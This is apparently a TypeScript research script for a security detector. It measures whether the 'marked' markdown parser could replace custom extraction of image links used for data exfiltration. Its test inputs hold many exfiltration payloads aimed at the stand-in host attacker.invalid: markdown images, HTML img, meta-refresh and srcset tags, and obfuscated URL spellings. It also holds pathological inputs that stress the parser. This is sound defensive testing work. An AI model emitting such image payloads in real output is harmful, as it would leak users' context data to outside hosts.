// T77 — is replacing the hand-rolled markdown extraction with `marked`'s token
// stream viable? Measured, not argued, on four axes:
//
//   0. AVAILABILITY — can the mandatory floor import it at all, in the artifact
//      this project publishes?
//   1. SPAN MAPPING — can a token be mapped back to a byte span in the ORIGINAL
//      input, so masking still lands on the raw bytes?
//   2. PERFORMANCE — inside a floor that always runs, on the pathological shapes
//      T72 found and on ordinary payloads.
//   3. CORRECTNESS — against the shapes eight rounds have accumulated. The floor
//      must OVER-approximate; a parser resolves exactly one renderer's rules, so
//      the question is what adopting it would RELEASE.
//
// Read-only, offline, synthetic hosts only. Usage: bun T77-viability.ts [out.json]
import { marked, Lexer } from "marked";
import { detectExfil } from "../../../../src/security/detect/exfil";

const ATT = "attacker.invalid";
const U = `https://${ATT}/p?ctx=CTX`;

type Row = { axis: string; id: string; verdict: string; detail: string };
const rows: Row[] = [];
const add = (axis: string, id: string, verdict: string, detail: string) =>
  rows.push({ axis, id, verdict, detail });

// ---------------------------------------------------------------------------
// AXIS 0 — availability
const pkg = await Bun.file(new URL("../../../../package.json", import.meta.url)).json();
const declared =
  (pkg.dependencies?.marked ?? null) ||
  (pkg.optionalDependencies?.marked ?? null) ||
  (pkg.devDependencies?.marked ?? null);
add(
  "availability",
  "declaredInPackageJson",
  declared ? "OK" : "FAIL",
  `dependencies=${JSON.stringify(pkg.dependencies)} optional=${JSON.stringify(
    Object.keys(pkg.optionalDependencies ?? {}),
  )} dev=${JSON.stringify(Object.keys(pkg.devDependencies ?? {}))} -> marked declared: ${String(
    Boolean(declared),
  )}`,
);
const lock = await Bun.file(new URL("../../../../bun.lock", import.meta.url)).text();
const viaOpentui = /"@opentui\/core@[^"]*", "", \{ "dependencies": \{[^}]*"marked"/.test(lock);
add(
  "availability",
  "reachedOnlyThroughOptionalDependency",
  viaOpentui ? "FAIL" : "OK",
  viaOpentui
    ? "marked is present ONLY as a transitive dependency of @opentui/core, which package.json lists under optionalDependencies. An optional dependency may be absent after install, so an import in the mandatory floor can throw at module load."
    : "marked is reachable independently of @opentui/core",
);
add(
  "availability",
  "shippedArtifactCarriesIt",
  "FAIL",
  `package.json "files" = ${JSON.stringify(pkg.files)}; the build externalises @opentui/core (${String(
    /--external @opentui\/core/.test(pkg.scripts?.build ?? ""),
  )}), so the published bundle resolves marked at runtime through that optional tree or not at all.`,
);

// ---------------------------------------------------------------------------
// AXIS 1 — span mapping
const doc = `intro\n\n![a](${U})\n\ntail\n`;
const blockTokens = new Lexer().lex(doc);
const imageToken = (() => {
  let found: Record<string, unknown> | null = null;
  marked.walkTokens(blockTokens, (t) => {
    if ((t as { type?: string }).type === "image" && !found) found = t as never;
  });
  return found as Record<string, unknown> | null;
})();
add(
  "spanMapping",
  "tokenCarriesAnOffset",
  imageToken && ("start" in imageToken || "position" in imageToken || "offset" in imageToken)
    ? "OK"
    : "FAIL",
  `image token keys = ${JSON.stringify(Object.keys(imageToken ?? {}))} — no start/end/position/offset field`,
);
add(
  "spanMapping",
  "hrefIsTheRawSourceSpan",
  imageToken && String(imageToken.href) === U ? "OK" : "FAIL",
  `href=${JSON.stringify(imageToken?.href)} raw=${JSON.stringify(imageToken?.raw)}`,
);
// href vs raw bytes, on the spellings this floor exists to mask
const hrefFidelity: { id: string; source: string; href: string; equal: boolean }[] = [];
for (const [id, src] of Object.entries({
  charrefColon: `![a](https&#58;//${ATT}/p)`,
  tabInScheme: `![a](ht\tps://${ATT}/p)`,
  spaceAngle: `![a](<https://${ATT}/a b>)`,
  backslash: `![a](https:\\\\${ATT}/p)`,
  quoteInUrl: `![a](https://${ATT}/p?q="x")`,
})) {
  let href = "";
  marked.walkTokens(new Lexer().lex(src), (t) => {
    if ((t as { type?: string }).type === "image") href = String((t as { href?: string }).href ?? "");
  });
  const inner = src.slice(src.indexOf("](") + 2, src.lastIndexOf(")"));
  hrefFidelity.push({ id, source: inner, href, equal: inner === href });
}
add(
  "spanMapping",
  "hrefEqualsRawBytesAcrossSpellings",
  hrefFidelity.every((h) => h.equal) ? "OK" : "FAIL",
  JSON.stringify(hrefFidelity),
);
// can offsets be rebuilt by concatenating raw?
const concatEqualsSource = blockTokens.map((t) => t.raw).join("") === doc;
const crlfDoc = `a\r\n\r\n![a](${U})\r\n`;
const crlfConcat = new Lexer().lex(crlfDoc).map((t) => t.raw).join("") === crlfDoc;
add(
  "spanMapping",
  "rawConcatenationReproducesSource",
  concatEqualsSource && crlfConcat ? "OK" : "FAIL",
  `lf=${String(concatEqualsSource)} crlf=${String(crlfConcat)} (marked preprocesses \\r\\n, so raw offsets drift from the original bytes)`,
);

// ---------------------------------------------------------------------------
// AXIS 2 — performance of the parser itself, on T72's pathological shapes
const perfShapes: Record<string, string> = {
  openBracketRun200k: "[".repeat(200000),
  unterminatedDestination100k: "![a](" + "A".repeat(100000),
  openRunThenUnterminated12k: "[".repeat(6250) + "![a](" + "A".repeat(6250),
  bangBracketRun200k: "![".repeat(200000),
  nestedBrackets: "[".repeat(50000) + "]".repeat(50000),
  realistic40k:
    "# Report\n\nchart ![c](https://cdn.example.org/c.png)\n\n![dump](" +
    "0123456789abcdef".repeat(2500) +
    "\n",
};
const perf: { id: string; bytes: number; markedMs: number; detectorMs: number }[] = [];
for (const [id, text] of Object.entries(perfShapes)) {
  let markedMs = -1;
  try {
    const t0 = performance.now();
    new Lexer().lex(text);
    markedMs = Math.round((performance.now() - t0) * 10) / 10;
  } catch (error) {
    markedMs = -1;
    add("performance", id, "THROW", String(error).slice(0, 160));
  }
  const t1 = performance.now();
  detectExfil(text, []);
  const detectorMs = Math.round((performance.now() - t1) * 10) / 10;
  perf.push({ id, bytes: text.length, markedMs, detectorMs });
}

// ---------------------------------------------------------------------------
// AXIS 3 — correctness: what would adopting the parser RELEASE?
// Every shape the detector currently flags that `marked` does not resolve to an
// image is a coverage row a token-stream implementation would drop.
const coverageShapes: Record<string, string> = {
  depth2: `![a[b[c]d]e](${U})`,
  depth3: `![a[b[c[d]e]f]g](${U})`,
  depth6: `![a[b[c[d[e[f]g]h]i]j]k](${U})`,
  unbalancedOpen: `![a[](${U})`,
  escapedClose: `![a\\](${U})`,
  htmlImgInFence: "```html\n<img src=\"" + U + '">\n```\n',
  htmlImgInComment: `<!-- <img src="${U}"> -->`,
  baseInFence: "```\n<base href=\"" + U + '">\n```\n',
  metaRefresh: `<meta http-equiv="refresh" content="0;url=${U}">`,
  inputTypeImageCharref: `<input type="&#105;mage" src="${U}">`,
  srcsetCandidate: `<img srcset="https://cdn.example.org/a.png 1x, ${U} 2x">`,
  videoPoster: `<video poster="${U}">`,
  componentMarkup: `<Video src="${U}" />`,
  imgInsideAttributeValueDecoy: `<img alt="x" src="${U}">`,
};
const coverage: { id: string; detectorFindings: number; markedResolvesImage: boolean }[] = [];
for (const [id, text] of Object.entries(coverageShapes)) {
  const html = String(await marked.parse(text, { async: true }));
  const resolvesImage = /<img[^>]*\ssrc="[^"]*attacker\.invalid/i.test(html);
  coverage.push({
    id,
    detectorFindings: detectExfil(text, []).length,
    markedResolvesImage: resolvesImage,
  });
}
const wouldBeReleased = coverage
  .filter((c) => c.detectorFindings > 0 && !c.markedResolvesImage)
  .map((c) => c.id);

// what does the parser do with malformed input / can it be made to throw?
const malformed: { id: string; outcome: string }[] = [];
for (const [id, text] of Object.entries({
  loneSurrogate: "![a](" + String.fromCharCode(0xd800) + ")",
  nulByte: `![a](https://${ATT}/ p)`,
  deepNest: "[".repeat(20000) + "a" + "]".repeat(20000),
  hugeTable: ("|" + "a|".repeat(200) + "\n").repeat(200),
})) {
  try {
    const t0 = performance.now();
    new Lexer().lex(text);
    malformed.push({ id, outcome: `ok in ${Math.round(performance.now() - t0)}ms` });
  } catch (error) {
    malformed.push({ id, outcome: `THREW ${String(error).slice(0, 120)}` });
  }
}

for (const r of rows) console.log(`${r.axis.padEnd(13)} ${r.id.padEnd(34)} ${r.verdict.padEnd(6)} ${r.detail}`);
for (const p of perf)
  console.log(
    `performance   ${p.id.padEnd(34)} bytes=${String(p.bytes).padStart(7)} markedLexMs=${String(p.markedMs).padStart(10)} detectorMs=${String(p.detectorMs).padStart(10)}`,
  );
for (const c of coverage)
  console.log(
    `correctness   ${c.id.padEnd(34)} detectorFindings=${c.detectorFindings} markedResolvesImage=${c.markedResolvesImage}`,
  );
for (const m of malformed) console.log(`malformed     ${m.id.padEnd(34)} ${m.outcome}`);

const summary = {
  availabilityFailures: rows.filter((r) => r.axis === "availability" && r.verdict === "FAIL").map((r) => r.id),
  spanMappingFailures: rows.filter((r) => r.axis === "spanMapping" && r.verdict === "FAIL").map((r) => r.id),
  perf,
  coverageRowsAdoptionWouldRelease: wouldBeReleased,
  coverageRowsCount: coverage.length,
  malformed,
  markedVersion: (await Bun.file(new URL("../../../../node_modules/marked/package.json", import.meta.url)).json()).version,
};
console.log(JSON.stringify(summary, null, 2));

const dest = process.argv[2];
if (dest) await Bun.write(dest, JSON.stringify({ summary, rows, coverage }, null, 2));
